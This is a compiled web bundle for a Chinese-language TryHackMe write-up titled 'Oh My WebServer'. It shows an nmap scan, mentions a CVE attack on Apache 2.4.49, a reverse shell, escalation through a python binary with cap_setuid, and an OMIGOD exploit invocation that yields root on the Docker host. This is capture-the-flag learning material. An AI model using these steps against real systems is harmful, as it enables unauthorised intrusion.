"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[9476],{62578:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>s,default:()=>p,frontMatter:()=>i,metadata:()=>a,toc:()=>l});var r=t(74848),o=t(28453);const i={sidebar_position:100,tags:["Easy","Linux","docker"],title:"Oh My WebServer",description:"Oh My WebServer",sidebar_label:"Oh My WebServer",slug:"/tryhackme/100"},s="Oh My WebServer",a={id:"box/TryHackMe/100",title:"Oh My WebServer",description:"Oh My WebServer",source:"@site/docs/box/TryHackMe/100.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/100",permalink:"/docs/tryhackme/100",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"docker",permalink:"/docs/tags/docker"}],version:"current",sidebarPosition:100,frontMatter:{sidebar_position:100,tags:["Easy","Linux","docker"],title:"Oh My WebServer",description:"Oh My WebServer",sidebar_label:"Oh My WebServer",slug:"/tryhackme/100"},sidebar:"boxSidebar",previous:{title:"Bookstore",permalink:"/docs/tryhackme/99"},next:{title:"VulnNet",permalink:"/docs/tryhackme/101"}},c={},l=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"daemon",id:"daemon",level:3},{value:"daemon \u2014&gt; root (docker)",id:"daemon--root-docker",level:3},{value:"root (docker) \u2014&gt; root",id:"root-docker--root",level:3}];function d(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,o.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.h1,{id:"oh-my-webserver",children:"Oh My WebServer"}),"\n",(0,r.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-38-183:~/ohmyweb# nmap -sTCV -p  22,80 --min-rate 1000 10.10.73.139\n\nStarting Nmap 7.60 ( <https://nmap.org> ) at 2023-09-18 09:32 BST\nNmap scan report for ip-10-10-73-139.eu-west-1.compute.internal (10.10.73.139)\nHost is up (0.00017s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    Apache httpd 2.4.49 ((Unix))\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Apache/2.4.49 (Unix)\n|_http-title: Consult - Business Consultancy Agency Template | Home\nMAC Address: 02:70:B0:96:1E:0D (M/a-com Companies)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at <https://nmap.org/submit/> .\nNmap done: 1 IP address (1 host up) scanned in 8.04 seconds\n"})}),"\n",(0,r.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,r.jsx)(n.h3,{id:"daemon",children:"daemon"}),"\n",(0,r.jsx)(n.p,{children:"\u67e5\u770b 80 \u7684\u7248\u672c, \u6211\u77e5\u9053\u7740\u4f30\u8ba1\u662f\u4e2a CVE \u6f0f\u6d1e\u4e86, \u6211\u5c31\u76f4\u63a5\u4f7f\u7528\u4e86 CVE \u6f0f\u6d1e\u5f00\u59cb\u653b\u51fb"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-124348.png",alt:"Untitled"})}),"\n",(0,r.jsx)(n.h3,{id:"daemon--root-docker",children:"daemon \u2014> root (docker)"}),"\n",(0,r.jsx)(n.p,{children:"\u5229\u7528\u4e0a\u9762\u5f97\u5230\u7684 Shell \u83b7\u53d6\u4e00\u4e2a\u53cd\u5411 Shell  \u6765\u8fdb\u884c\u5de9\u56fa, \u540c\u65f6\u67e5\u770b\u73af\u5883\u6211\u77e5\u9053\u8fd9\u662f\u4e00\u4e2a docker \u5bb9\u5668, \u6240\u4ee5\u6211\u5f00\u59cb\u5c1d\u8bd5\u63d0\u6743\u6216\u8005\u8d8a\u72f1, \u6211\u53d1\u73b0\u5728\u5bb9\u5668\u4e2d\u6709\u4e00\u4e2a capabilities \u7a0b\u5e8f"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"Files with capabilities (limited to 50):\n/usr/bin/python3.7 = cap_setuid+ep\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6b64\u6765\u83b7\u53d6\u5230\u4e00\u4e2a docker \u5185\u7684 root \u6743\u9650 ",(0,r.jsx)(n.a,{href:"https://gtfobins.github.io/gtfobins/python/#capabilities",children:"python#capabilities"})]}),"\n",(0,r.jsx)(n.h3,{id:"root-docker--root",children:"root (docker) \u2014> root"}),"\n",(0,r.jsx)(n.p,{children:"\u6839\u636e\u4e00\u822c\u89c4\u5219, \u6211\u4eec\u7684\u4e3b\u673a\u5e94\u8be5\u662f 172.17.0.1, \u6240\u4ee5\u6211\u5f00\u59cb\u4e86\u5185\u7f51\u7684\u626b\u63cf"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"PORT     STATE  SERVICE\n22/tcp   open   ssh\n80/tcp   open   http\n5985/tcp closed unknown\n5986/tcp open   unknown\n"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"80 \u7aef\u53e3\u4f30\u8ba1\u662f\u6211\u4eec\u7684\u5bb9\u5668\u6620\u5c04\u51fa\u53bb\u7684"}),"\n",(0,r.jsx)(n.li,{children:"5986 \u7ecf\u8fc7\u67e5\u627e\u662f\u4e00\u4e2a OMI \u7a0b\u5e8f, \u800c\u4e14\u53ea\u6709\u4e00\u79cd\u5229\u7528\u65b9\u5f0f, \u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u4e0a\u4f20\u5bf9\u5e94\u7684\u811a\u672c\u8fdb\u884c\u5229\u7528\u5373\u53ef"}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"(remote) root@4a70924bafa0:/# python3 omigod.py -t 172.17.0.1 -c id\nuid=0(root) gid=0(root) groups=0(root)\n"})})]})}function p(e={}){const{wrapper:n}={...(0,o.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(d,{...e})}):d(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>s,x:()=>a});var r=t(96540);const o={},i=r.createContext(o);function s(e){const n=r.useContext(i);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:s(e.components),r.createElement(i.Provider,{value:n},e.children)}}}]);